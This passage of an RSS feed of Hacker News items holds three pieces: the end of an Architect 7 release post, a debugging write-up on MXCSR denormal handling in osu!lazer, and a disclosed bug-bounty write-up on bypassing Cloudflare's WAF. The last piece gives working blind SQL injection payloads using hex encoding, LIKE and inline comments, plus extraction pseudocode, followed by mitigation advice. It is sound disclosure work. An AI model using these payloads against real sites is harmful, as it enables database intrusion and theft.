srcset="https://miro.medium.com/max/552/1*3FwfgGmDs6TR5RIpacUbYA.png 276w, https://miro.medium.com/max/1104/1*3FwfgGmDs6TR5RIpacUbYA.png 552w, https://miro.medium.com/max/1280/1*3FwfgGmDs6TR5RIpacUbYA.png 640w, https://miro.medium.com/max/1400/1*3FwfgGmDs6TR5RIpacUbYA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*3FwfgGmDs6TR5RIpacUbYA.png?q=20"></p></div></div></div></figure><p id="8191">For most applications most of the time, we now believe <code>HTTP</code> APIs are the right way to ship a serverless app on AWS. Compared to legacy <code>REST</code> APIs, there are some compelling reasons to use (and upgrade) to <code>HTTP</code>:</p><p id="cab4">- <code>HTTP</code> APIs are designed to be lower-latency<br>- <code>HTTP</code> APIs provision and update significantly faster<br>- <code>HTTP</code> APIs are far less expensive to operate: as of this writing, they cost ‚â§$1.00/million requests, compared to <code>REST</code> APIs, which charge $3.50/million requests (plus data transferred)<br>- <code>HTTP</code> APIs support default stages and routes, meaning we can finally escape the dreaded API Stage Path Part Problem (e.g. <code>/staging</code> in <code><a href="https://{id}.execute-api.{region}.amazonaws.com/staging%60" rel="noopener">https://{id}.execute-api.{region}.amazonaws.com/staging</a></code>)<br>- <code>HTTP</code> APIs are where AWS is now putting the bulk of its API Gateway development effort<br>- As of September 2020, <code>HTTP</code> APIs now support authorizers (which can be implemented via <a href="https://arc.codes/primitives/macros" rel="noopener">Architect Macros</a>)</p><p id="5527">Existing Architect projects can upgrade to <code>HTTP</code> APIs with a single command; learn more in the <a href="https://arc.codes/guides/upgrade" rel="noopener">Architect upgrade guide</a>.</p><p id="3581">Architect 7 ships with a major upgrade to its local development and testing environment, <a href="https://github.com/architect/sandbox" rel="noopener">Sandbox 2.0</a>. Sandbox 2.0‚Äôs clean, unified testing interface enables granular controls for starting and stopping various local serverless services, and support for all major JS testing frameworks.</p><p id="8aa5">For example, here‚Äôs how to integrate Sandbox with two popular test libraries, <a href="https://github.com/substack/tape" rel="noopener">Tape</a> and <a href="https://jestjs.io/" rel="noopener">Jest</a>:</p><h2 id="b744">Tape</h2><pre><span id="4306">let sandbox = require('@architect/sandbox')<br>let test = require('tape)<p>test('Start the Sandbox', async t =&gt; {<br>  t.plan(1)<br>  let result = await sandbox.start()<br>  t.equal(result, 'Sandbox successfully started')<br>})</p><p>test('Tests go here', t =&gt; {<br>  // Make use of various Sandbox resources in your tests...<br>})</p><p>test('Shut down the Sandbox', async t =&gt; {<br>  t.plan(1)<br>  let result = await sandbox.end()<br>  t.equal(result, 'Sandbox successfully shut down')<br>})</p></span></pre><h2 id="ec26">Jest</h2><pre><span id="8c59">let sandbox = require('@architect/sandbox')</span><span id="261c">beforeAll(async () =&gt; {<br>  let result = await sandbox.start()<br>  expect(result).toBe('Sandbox successfully started')<br>})</span><span id="a76d">afterAll(async () =&gt; {<br>  let result = await sandbox.end()<br>  expect(result).toBe('Sandbox successfully shut down')<br>})</span><span id="f734">test('Tests go here', () =&gt; {<br>  // Make use of various Sandbox resources in your tests...<br>})</span></pre><p id="6635">Where possible, we‚Äôve taken every possible measure to ensure a seamless upgrade to Architect 7.x from 6.x (Ogopogo) and earlier. Architect 7.x is fully backward compatible, and continues to ship API Gateway REST APIs to existing Architect projects.</p><p id="d4e0">Changes to Sandbox may require minor settings updates for local workflows, and its new testing interface does remove support for some obscure, undocumented APIs.</p><p id="4e1d">To learn more, please check out our extensive <a href="https://arc.codes/guides/upgrade" rel="noopener">Architect upgrade guide</a>.</p><p id="405a">We couldn‚Äôt do this work without the support and feedback of the Architect community, and of the folks at AWS working hard to make the future a little more serverless.</p><blockquote><p id="0890"><strong>More specifically, we‚Äôd like to give a shout out to:</strong><br>Akash Peri, Alan Tan, Khozema Ujjainwala, and the entire API Gateway team, Ali Servet Donmez, Andy Buckingham, Carter Rabasa, Fil Maj, Greg Allen, Gregor Martynus, Jordan Harband, Jory Burson, and Kris Borchers.</p></blockquote><p id="44e9">Since releasing Architect with the OpenJS Foundation, there have been over 390 releases ‚Äî with many <a href="https://github.com/architect/architect/issues/new/choose" rel="noopener">more to come based on your feedback</a> and <a href="https://github.com/architect/" rel="noopener">contributions</a>.</p><p id="1c93">Oh, and don‚Äôt forget to <a href="https://architecture-as-text.slack.com/archives/C6BGT0D08/p1600199636147600" rel="noopener">join the Architect conversation in Slack</a>!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.begin.com/architect-7-0-http-apis-and-even-better-sandbox-testing-c84df06cd443</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520761</guid>
            <pubDate>Fri, 18 Sep 2020 19:11:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When double.Epsilon can equal 0]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24520728">thread link</a>) | @maple3142
<br/>
September 18, 2020 | https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html | <a href="https://web.archive.org/web/*/https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" aria-label="Content">
  <div>
    <article>
      <div>
        <p>Most of the time debugging isn‚Äôt really much to write about, especially in C# land.
In a language executing on a VM, with a managed memory model, most bugs are relatively shallow and easy to fix, except for the occasional race if you‚Äôre doing multi-threading - so when suddenly it appears that comparison of doubles has stopped working correctly, all bets are off.</p>

<p>About the only options available at that point that don‚Äôt result in loss of sanity are:</p>

<ol>
  <li>give up investigating and accept that computers are fickle, unknowable machines, uncontrollable by your puny meat-based mind,</li>
  <li>spend a week of evenings looking at why the program you‚Äôre looking at apparently entirely fails at arithmetic.</li>
</ol>

<p>From the fact that this post exists, you‚Äôve probably guessed that I went for #2.</p>



<p>It all started with <a href="https://github.com/ppy/osu/issues/9952">yet another GitHub issue</a>, in which a user reported a crash after clicking around in the <a href="https://github.com/ppy/osu">osu!lazer</a> beatmap editor.
(I won‚Äôt go into the particular details of what a beatmap editor is, as it‚Äôs mostly unimportant to the larger topic of this post.)</p>

<p>As is usual operating procedure, I, along with others, went to try to reproduce the problem on my Ubuntu install, and failed; it looked like it was going to be yet another irreproducible, and therefore inactionable, crash report.</p>

<p>The first ‚Äúhail mary‚Äù came from the reporter themselves - they managed to ascertain that the crash only happened when the game was ran in single-threaded mode, and in a joint effort we‚Äôve also managed to ascertain that it was also Windows-specific.
This already bore the signs that it was going to be an <em>interesting</em> one to deal with - especially given where the crash was located at‚Ä¶</p>

<p>Without going through too much unnecessary detail, the bespoke framework that osu!lazer uses has the concept of <em>bindables</em>.
A bindable is a wrapper around a value; a bindable can be, as the name suggests, <em>bound</em> to another bindable, and therefore bidirectionally receive and send value updates to and from the other bindable.
This allows showing one particular value in multiple places on the UI, and ensuring that if one instance changes, the others will follow suit.</p>

<p>For numerical bindables, backed by floating-point values, the bindables have a built-in notion of precision, to prevent changes on the order of 1e-10 firing all sorts of callbacks when they don‚Äôt really matter.
Here‚Äôs the implementation of the <code>Precision</code> property:</p>

<div><div><pre><code><span>public</span> <span>T</span> <span>Precision</span>
<span>{</span>
    <span>get</span> <span>=&gt;</span> <span>precision</span><span>;</span>
    <span>set</span>
    <span>{</span>
        <span>if</span> <span>(</span><span>precision</span><span>.</span><span>Equals</span><span>(</span><span>value</span><span>))</span>
            <span>return</span><span>;</span>

        <span>if</span> <span>(</span><span>value</span><span>.</span><span>CompareTo</span><span>(</span><span>default</span><span>)</span> <span>&lt;=</span> <span>0</span><span>)</span>
            <span>throw</span> <span>new</span> <span>ArgumentOutOfRangeException</span><span>(</span><span>nameof</span><span>(</span><span>Precision</span><span>),</span> <span>value</span><span>,</span> <span>"Must be greater than 0."</span><span>);</span>

        <span>SetPrecision</span><span>(</span><span>value</span><span>,</span> <span>true</span><span>,</span> <span>this</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>For some reason, on Windows, in single-threaded mode, setting <code>Precision</code> to <code>double.Epsilon</code> caused the <code>ArgumentOutOfRangeException</code> to be thrown, even though <code>double.Epsilon</code> is <em>definitively</em> larger than zero.
Debugger or no debugger, you could <em>see</em> <code>value</code> having <code>5e-324</code> in a watch and <code>default</code> being <code>0</code>, and then the branch with the throw would be taken <em>anyway</em>, almost as if the fabric of reality was slipping from right under your feet.</p>

<p>It was clearly time to leave my beloved Rider, open up the rusty (but trusty) Visual Studio and get out the disassembly window.
After having enabled native debugging in the project settings and stepping into <code>double.CompareTo()</code>, I saw the following assembly code:</p>

<div><div><pre><code>--- /_/src/System.Private.CoreLib/shared/System/Double.cs ----------------------
            if (m_value &lt; value) return -1;
00007FFA1F5307E0  sub         rsp,18h
00007FFA1F5307E4  vzeroupper
00007FFA1F5307E7  vmovsd      xmm0,qword ptr [rcx]
00007FFA1F5307EB  vucomisd    xmm1,xmm0         ; compare xmm1 to xmm0
00007FFA1F5307EF  ja          00007FFA1F53084D  ; jump if above (CF = 0, ZF = 0)
            if (m_value &gt; value) return 1;
00007FFA1F5307F1  vucomisd    xmm0,xmm1
00007FFA1F5307F5  ja          00007FFA1F53085E
            if (m_value == value) return 0;
00007FFA1F5307F7  vucomisd    xmm0,xmm1
00007FFA1F5307FB  jp          00007FFA1F5307FF  ; jump if parity (PF = 0)
00007FFA1F5307FD  je          00007FFA1F530857  ; jump if equal (ZF = 0)
</code></pre></div></div>

<p>And, sure enough, I could definitely see that the execution of these instructions differed beteween multi-threaded and single-threaded mode.
Using the ‚ÄúRegisters‚Äù window I dumped the register state in both cases and got the following result (click screenshot below to enlarge):</p>

<p><a href="https://bdach.github.io/assets/images/lazer/mxcsr/comparison.png" target="_blank"><img src="https://bdach.github.io/assets/images/lazer/mxcsr/comparison.png" alt=""></a></p>

<p><code>xmm0</code> and <code>xmm1</code> clearly have sane and expected values in both cases, so it definitely wasn‚Äôt a mis-store.
It was the comparison <em>itself</em> that was somehow wrong - but why?</p>

<p>I quickly (and, in retrospect, stupidly) went to confirm that the issue was CPU vendor-agnostic, and got the confirmation that it happens on both Intel and AMD CPUs.
About the only meaningful discrepancy seemed to be the mystery <code>MXCSR</code> value, so it was time to investigate.</p>



<p>Before having departed on this journey, I have never really cared to look up anything about SSE/AVX registers.
Any readers that possess such knowledge have already spotted the problem in the screenshot above, but for those that presumably have never looked into anything of the sort, this section aims to be a brief recap.</p>

<p>The <code>vucomisd</code> instruction is a - watch out - <em>vectorised unordered compare of scalar double-precision floating point values</em> that happens to return its result in <code>EFLAGS</code>.
Let‚Äôs break this down further into constituent parts:</p>

<ul>
  <li>The <em>vectorised</em> part means SIMD (<em>single instruction, multiple data</em>).
SIMD instructions allow <em>data parallelisation</em> - on a concrete example, you can execute one common instruction simultaneously on <code>N</code> different values at a time.
Thankfully in this case that part isn‚Äôt really all that relevant.</li>
  <li>The <em>unordered</em> part relates to <code>NaN</code>s.
In IEEE 754 floating-point math, <code>NaN</code>s are special (and annoying) values that fail every comparison they‚Äôre part of (so a <code>NaN</code> is neither less, greater than or equal to any other number, including another <code>NaN</code>).</li>
  <li><em>Compare of scalar double-precision floating point values</em> sounds about right for what we wanted in the C# code to begin with.</li>
</ul>

<p>The result is returned in <code>EFLAGS</code>, which is a special quasi-register that is better viewed as a set of flags.
Here is the table describing the possible results of a <code>vucomisd</code> instruction:</p>

<table>
  <thead>
    <tr>
      <th>result</th>
      <th>zero flag (ZF)</th>
      <th>parity flag (PF)</th>
      <th>carry flag (CF)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>unordered (one of operands is a <code>NaN</code>)</td>
      <td>1</td>
      <td>1</td>
      <td>1</td>
    </tr>
    <tr>
      <td>greater than</td>
      <td>0</td>
      <td>0</td>
      <td>0</td>
    </tr>
    <tr>
      <td>less than</td>
      <td>0</td>
      <td>0</td>
      <td>1</td>
    </tr>
    <tr>
      <td>equal</td>
      <td>1</td>
      <td>0</td>
      <td>0</td>
    </tr>
  </tbody>
</table>

<p>Now, the <code>MXCSR</code> register is a special <em>control register</em>, in that it <em>controls</em> how the other SSE/AVX instructions execute.
In this particular case we‚Äôre interested in two related flags, one of which will turn out to be causing the madness.</p>

<ul>
  <li>Bit 15 of the register is <em>Flush To Zero (FTZ)</em>. Setting that bit will cause <em>writes</em> of denormal floating-point values to be coerced to zero.</li>
  <li>Bit 6 of the register is <em>Denormals Are Zero (DAZ)</em>. Setting that bit will cause <em>reads</em> of denormal floating-point values to be coerced to zero.</li>
</ul>

<p>This is immediately eye-catching in this particular scenario, as coercion to zero would definitively explain the differing equality result.
However, to confirm, let‚Äôs define what a <em>denormal value</em> is (because I didn‚Äôt know either).</p>

<p>A denormal value is a floating-point value that has leading zeroes in the significand (so it‚Äôs of the form 0.00‚Ä¶1‚Ä¶).
This can only happen if the exponent of the value is all zeroes - in that case, the implicit leading 1, normally assumed for any other exponent, is swapped for a zero.
Therefore, the largest denormal double-precision value is</p>

<div><div><pre><code>0b0 0000000000 1111111111111111111111111111111111111111111111111111 = 2.225073858507201e-308
  ¬± |exponent| |--------------mantissa/significand----------------|
</code></pre></div></div>

<p>Because <code>double.Epsilon</code> is essentially a <code>(uint64_t)0x1</code>, it definitely <em>is</em> a denormal number.
And, sure enough, as the screenshot above demonstrates, DAZ is <em>set</em> in the single-threaded case, in which the issue reproduces.</p>

<p>Incidentally, <code>MXCSR</code> (at least on Windows) is part of the thread context, which explains why the multi-threaded mode worked fine - it‚Äôs incredibly likely that the change also occurs in multi-threaded mode, but doesn‚Äôt affect other threads, including the one that does the bogus comparison, therefore effectively ‚Äúhiding‚Äù the issue.</p>

<p>That answers the immediate question of what‚Äôs going wrong, but now there‚Äôs a <em>huge</em> problem - anyone could be writing a value to a register at any time, so <em>who is</em>?</p>



<p>This is <em>about</em> the point where I started freaking out.
The obvious first step for a programmer during a freak-out is to start frantically googling around for <em>something</em> that can be related, and so I made my way over to <a href="https://github.com/dotnet/runtime"><code>dotnet/runtime</code></a> and started typing in vaguely related terms.</p>

<p>Surprise, it wasn‚Äôt an issue in the runtime itself, but I <em>did</em> find a few important clues:</p>

<ul>
  <li>
    <p>First, I <a href="https://github.com/dotnet/runtime/blob/96f178d32b7ba62485917ac46ef1edcfd3c2d10d/src/coreclr/src/vm/cgensys.h#L157-L171">found calls</a> to the <code>_mm_setcsr()</code> x64 intrinsic, which set the value of <code>MXCSR</code>:</p>

    <div><div><pre><code>  <span>ResetProcessorStateHolder</span> <span>()</span>
  <span>{</span>
<span>#if defined(TARGET_AMD64)
</span>      <span>m_mxcsr</span> <span>=</span> <span>_mm_getcsr</span><span>();</span>
      <span>_mm_setcsr</span><span>(</span><span>0x1f80</span><span>);</span>
<span>#endif // TARGET_AMD64
</span>  <span>}</span>

  <span>~</span><span>ResetProcessorStateHolder</span> <span>()</span>
  <span>{</span>
<span>#if defined(TARGET_AMD64)
</span>      <span>_mm_setcsr</span><span>(</span><span>m_mxcsr</span><span>);</span>
<span>#endif // TARGET_AMD64
</span>  <span>}</span>
</code></pre></div>    </div>

    <p>This clearly shows that the runtime is aware of what a <code>MXCSR</code> is and it <em>does</em> try to restore the sane value of <code>0x1F80</code>, <em>sometimes</em>.
I didn‚Äôt follow up on when, because I figured it was <em>very</em> unlikely Microsoft engineers would overlook something of this magnitude, and it was probably something that we were doing, directly or indirectly.</p>
  </li>
  <li>
    <p>Secondly, I spotted <a href="https://github.com/dotnet/runtime/blob/56797842d45a0f55345842ab166618d0c153ec3c/src/coreclr/src/jit/utils.cpp#L2086-L2087">this comment</a>:</p>

    <div><div><pre><code><span>// Return Value:</span>
<span>//    True if 'x' is a power of two value and is not denormal (denormals may not be well-defined</span>
<span>//    on some platforms such as if the user modified the floating-point environment via a P/Invoke)</span>
</code></pre></div>    </div>

    <p>This rang several alarm bells immediately.
As a cross-platform .NET Core game with a bespoke framework, lazer has to make a <em>lot</em> of P/Invokes and native calling to <em>be</em> a game.
Combined with the fact that denormals/flush to zero are usually set by programs that ‚Ä¶</p></li></ul></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html">https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html</a></em></p>]]>
            </description>
            <link>https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520728</guid>
            <pubDate>Fri, 18 Sep 2020 19:08:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I bypassed Cloudflare's SQL Injection filter]]>
            </title>
            <description>
<![CDATA[
Score 189 | Comments 84 (<a href="https://news.ycombinator.com/item?id=24520556">thread link</a>) | @gskourou
<br/>
September 18, 2020 | https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html | <a href="https://web.archive.org/web/*/https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

<!--         <header class="post-header">
            <a id="blog-logo" href="">
                
                    <span class="blog-title">Astrocamel</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2020-09-04">04 Sep 2020</time>
            
                on Web
            
        </span> -->

        <!-- <h1 class="post-title">How I bypassed Cloudflare's SQL Injection filter</h1> -->

        <section>
            <p>In late 2018 I was tasked with performing a Web Application security assessment
for a large client.
After running the standard scans with automated tools, something interesting
came up: a possible SQL injection which couldn‚Äôt be exploited using the tool.
The reason: Cloudflare‚Äôs WAF and more specifically its SQL Injection filter.</p>

<h4 id="details-about-the-application">Details about the application</h4>
<p>The application was a generic website written in PHP with MySQL as the backend
DBMS. The vulnerable page submitted a POST request with multipart form body
data to the /index.php endpoint. I honestly don‚Äôt remember the use of the form
and it doesn‚Äôt really matter for the writeup. The POST request looked like this:</p>

<figure><pre><code data-lang="http"><span>POST</span> <span>/index.php</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>******</span>
<span>Connection</span><span>:</span> <span>close</span>
<span>Accept-Encoding</span><span>:</span> <span>gzip, deflate</span>
<span>Accept</span><span>:</span> <span>*/*</span>
<span>Content-Type</span><span>:</span> <span>multipart/form-data; boundary=dc30b7aab06d4aff91d4285d7e60d4f3</span>

--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="126"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="127"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="130"

...
...

###### #### 6 ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="task"

form.save
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="form_id"

X-MARK
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="96"

############
--dc30b7aab06d4aff91d4285d7e60d4f3

...
...

Content-Disposition: form-data; name="115[]"

########## ################## #### ###### ######
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="125"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3--</code></pre></figure>

<p>The unsanitized parameter at X-MARK can be used to inject arbitrary values at
the place of the WHERE clause of an SQL SELECT query.
For example, if the above data was sent as the body of the POST request, the
SQL query which would be executed on the server would look something like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>X</span><span>-</span><span>MARK</span><span>;</span></code></pre></figure>

<p>The technique typically used for this kind of injection is a Time-based Blind
SQL injection. The problem was, that Cloudflare would recognize these kinds of
injections and block them on the spot. No matter how complicated I tried to make
the query or how many sqlmap tamper scripts I used, Cloudflare was always there.</p>

<p>To overcome this issue, I used an observation I made while manually testing for
SQL injections on the same request:
I had noticed that when I tried to inject code that resulted in something close
to the following SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'a'</span><span>;</span></code></pre></figure>

<p>the web server responded with status 200 OK.
When I tried to inject code that resulted in something close to this SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'b'</span><span>;</span></code></pre></figure>

<p>the server responded with status 500 Internal Server Error.</p>

<p>In other words when the SQL query in the backend did NOT return results, the web
server complained and crashed (probably because the backend code tried to access
an item in the returned list whose index was out of range).
This gave me an idea: writing a script that compared a character picked from the
name of the required DBMS entity and sequentially compared it with all
characters. The idea was, if the two characters matched, the server would return
a 200 OK status, else it would return a 500 Internal Server Error status and I
would have to compare the requested character with the next character in my
list.</p>

<h4 id="first-try">First Try</h4>
<p>My thinking was that if a wanted to find the first second character of the name
of the fifth table (as they are listed in information_schema.tables), I would
start by asking MySQL if that character is equal to ‚Äòa‚Äô and if not I would
continue with ‚Äòb‚Äô, ‚Äòc‚Äô etc. I would start by inject the following string (for
comparison with ‚Äòa‚Äô):</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>which would result in the following SQL query to be executed on the server:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span>
<span>WHERE</span> <span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>When I found the table name to be t1 for example, I was to brute force its
columns‚Äô names with the following starting injection:</p>

<p><em>INJECTION 1</em></p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>and then actually get values out of column c1 of table t1 by starting with the
following injection:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>c1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>t1</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The idea was good, but Cloudflare would complain about the ‚Äò=‚Äô sign. The
injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span> <span>'b'</span></code></pre></figure>

<p>would get blocked by Cloudflare‚Äôs WAF. After a bit of fiddling, I came up with
the following request that bypassed the ‚Äò=‚Äô restriction:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>This means that the initial injection <em>INJECTION 1</em> would become:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="second-try">Second Try</h4>
<p><em>INJECTION 1</em> was still not ready to go. Cloudflare would still complain about stuff.
More specifically the injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>would still get blocked, not because of the LIKE keyword, but because of the ‚Äòa‚Äô
character. Comparing plain strings to anything was not allowed. To overcome this
issue I came up with the following injection that went through undetected by the
WAF:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>The above injection sends the character ‚Äòa‚Äô as the hex-encoded value ‚Äò0x61‚Äô
which still allows it to work:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'a'</span></code></pre></figure>

<p>still returns True, and</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>passes through undetected and returns False.</p>

<p>The resulting <em>INJECTION 1</em> now looks like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="third-try">Third Try</h4>
<p>The third obfuscation I had to enroll was a multi-line comment addition between
SQL query keywords. Cloudflare would block queries like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>but with a multi-line comment trick, the new query would go through undetected:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span><span>/*trick comment*/</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span>
<span>FROM</span><span>/*trick comment*/</span> <span>t1</span>
<span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>Thus, applying this method on <em>INJECTION 1</em>, would make it look like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span><span>/*trick comment*/</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span><span>/*trick comment*/</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The above injection is in its final form and when passed as a form value to the
vulnerable web application the web server will reply with a 200 OK if the
character ‚Äòa‚Äô matches the first character of the first column‚Äôs name of table
t1.</p>

<h4 id="full-speed-ahead">Full Speed Ahead</h4>
<p>To make the retrieving of table contents from the application‚Äôs database easier
I wrote a script in Python to automate the process. The pseudocode of the script
goes something like this:</p>

<figure><pre><code data-lang="python"><span># assert names of columns and table name is known
</span><span>alphabet</span> <span>=</span> <span>[</span><span>a</span><span>,</span><span>b</span><span>,</span><span>c</span><span>,...,</span><span>y</span><span>,</span><span>z</span><span>]</span>
<span>characterPosition</span> <span>=</span> <span>1</span> <span># the position of the character we are bruteforcing
</span><span>for</span> <span>rowNumber</span> <span>in</span> <span>[</span><span>0</span><span>,</span><span>20</span><span>]:</span>
  <span>for</span> <span>columnName</span> <span>in</span> <span>columns</span><span>:</span>
    <span>for</span> <span>character</span> <span>in</span> <span>alphabet</span><span>:</span>
      <span>sqlInjection</span> <span>=</span> <span>'''
        0x{hex_encode(character)} LIKE (
        SELECT/*trick comment*/ SUBSTRING({columnName}, characterPosition,1)
        FROM/*trick comment*/ tableName
        LIMIT {rowNumber}, 1
        )
      '''</span>

      <span>inject</span> <span>sqlInjection</span> <span>is</span> <span>POST</span> <span>request</span> <span>body</span>
      <span>if</span> <span>response</span><span>.</span><span>status</span> <span>==</span> <span>200</span><span>:</span>
        <span>result</span> <span>+=</span> <span>character</span>
        <span>recurse</span> <span>function</span> <span>with</span> <span>characterPosition</span><span>++</span>
      <span>elif</span> <span>response</span><span>.</span><span>status</span> <span>==</span> <span>500</span><span>:</span>
        <span>continue</span> <span>with</span> <span>next</span> <span>character</span> <span>in</span> <span>alphabet</span>

      <span>return</span> <span>result</span></code></pre></figure>

<p>And this is how I bypassed Cloudflare WAF‚Äôs SQL injection protection. I got a
free t-shirt and a place in <a href="https://hackerone.com/gskourou">Cloudflare‚Äôs HoF</a>.</p>

<h4 id="mitigation">Mitigation</h4>
<p>Cloudlfare reviewed and fixed the vulnerability a few days after my report.</p>
<p>The safest way to mitigate SQL injections on your databases is prepared
statements. These come in most database interaction libraries for most
languages. You can find a full list of ways to mitigate SQL injections at
<a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP</a>.
It is my opinion that if developers take good care to apply security measures
on their applications, WAFs are most of the times unnecessary. All you need to
do is sanitize the users‚Äô input properly.</p>


        </section>

        

        

    </article>

</div></div>]]>
            </description>
            <link>https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html</link>
